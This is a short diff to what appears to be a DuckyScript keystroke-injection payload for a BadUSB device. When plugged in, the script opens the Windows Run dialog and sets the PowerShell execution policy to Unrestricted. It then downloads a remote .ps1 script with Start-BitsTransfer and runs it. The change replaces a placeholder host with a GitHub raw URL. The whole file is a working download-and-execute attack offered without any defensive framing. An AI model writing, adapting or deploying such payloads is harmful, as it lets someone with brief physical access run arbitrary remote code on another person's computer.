@@ -1,7 +1,7 @@
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source http://domain.com/e -Destination $env:temp\e.ps1; powershell $env:temp\e.ps1;
+STRING powershell Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source https://raw.githubusercontent.com/DuongDarkFlippervgu/heheheh/main/p.ps1 -Destination $env:temp\e.ps1; powershell $env:temp\e.ps1;
 DELAY 500
 ENTER
 DELAY 1000
